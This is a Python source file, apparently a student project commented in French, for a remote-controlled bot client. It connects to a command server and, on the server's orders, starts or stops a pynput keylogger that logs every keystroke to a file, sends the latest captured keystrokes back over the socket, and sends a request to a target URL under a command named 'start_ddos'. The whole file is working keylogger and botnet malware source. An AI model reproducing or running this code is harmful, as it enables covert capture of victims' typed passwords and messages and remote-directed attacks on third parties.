import socket
import logging
from pynput import keyboard
import requests
import time


host = "localhost"
port = 61589

logging.basicConfig(filename = (r"C:\Users\Admin\Desktop\Projet_dev_multi_clients\dev_test\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

class Client():
    
    def __init__(self, socket, clientAddress):

        self.socket = socket
        self.clientAddress = clientAddress
        self.listener = keyboard.Listener()
        self.initialize()


    def connexion(self, socket, clientAddress):
        try:
            socket.connect(clientAddress)
            print("connecté !")
            ordre = socket.recv(1024).decode("utf-8")

            while True :    
                
                    
                if ordre == "start_Keylogger" :
                    self.listener.start()
                    print("keylogger fonctionne")
                    socket.send("Le keylogger est lancé".encode("utf-8"))
    
                elif ordre == "start_ddos":
                    self.ddos_attaque(socket)
                    socket.send("Requête réalisée avec succes ".encode("utf-8"))    
                        
                elif ordre == "stop_Keylogger":
                    self.listener.stop()
                    socket.send("Le keylogger est fermé".encode("utf-8"))
                    print("stop keylogger")
                       
                elif  ordre == "get_log":
                    self.send_log(socket)
                    print("Envoie des valeurs !")

                elif ordre == "fin_connexion":
                    socket.send("Le Client est ferme".encode("utf-8"))
                    break
                    
                ordre = socket.recv(1024).decode("utf-8")

                    
        except ConnectionRefusedError:
            print("La connexion au serveur à échouée ")
            

    def start_key(self, key):
            logging.info(str(key))

    def initialize(self):
        self.listener = keyboard.Listener(on_press=self.start_key)

    def ddos_attaque(self, socket):
        ip_ddos = socket.recv(1024).decode("utf-8")
        temps_en_seconde = socket.recv(1024).decode("utf-8")

        temps_en_seconde = int(temps_en_seconde)
        time.sleep(temps_en_seconde) 
        
        Ma_requete = requests.get(ip_ddos)
        if Ma_requete.status_code == 200 : 
            print("Requête réalisée avec succes ")
        else :
            print("Erreur lors de la requête")

    def send_log(self, socket):
        with open("keyLog.txt", "r") as key_log: 

            nb_lignes = 0
            lignes_key_log = key_log.readlines()


            for lignes in lignes_key_log:
                nb_lignes += 1

            nb_lignes_demande = socket.recv(1024).decode("utf-8")
            nb_lignes_demande = int(nb_lignes_demande)
            lignes_key_log.reverse()

            commencer_par_la_fin = str(lignes_key_log[:nb_lignes_demande])
            socket.send(commencer_par_la_fin.encode("utf-8"))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

clientAddress = ((host, port))

Client = Client(s, clientAddress)
Client.initialize()
Client.connexion(s, clientAddress)

print("Fin de la connection")
s.close()
